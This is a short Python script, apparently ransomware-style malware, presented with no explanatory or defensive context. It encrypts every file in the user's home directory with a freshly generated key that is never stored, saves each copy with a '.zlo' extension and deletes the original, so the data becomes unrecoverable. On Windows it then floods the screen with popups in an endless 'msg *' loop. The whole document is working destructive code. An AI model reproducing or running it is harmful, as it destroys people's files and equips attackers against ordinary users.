import os
import sys

# Encrypter code
# Import coder
from cryptography.fernet import Fernet # type: ignore

# Generate Key
key = Fernet.generate_key()

# Encrypter
def encrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        encrypted_file_path = file_path + ".zlo"
        with open(encrypted_file_path, "wb") as file:
            file.write(encrypted_data)
        print(f'{file_path} encrypted successfully!')
        os.remove(file_path)

    except Exception:
        pass


User_PC = os.path.expanduser('~')

for file in os.listdir(User_PC):
    file_path = os.path.join(User_PC, file)
    if os.path.isfile(file_path):
        encrypt_file(file_path, key)

Desc = 'desc'
osystem = sys.platform

if osystem == 'nt' or osystem == 'cygwin' or osystem == 'win32':
    while True:
        os.system(f'msg * {Desc}')
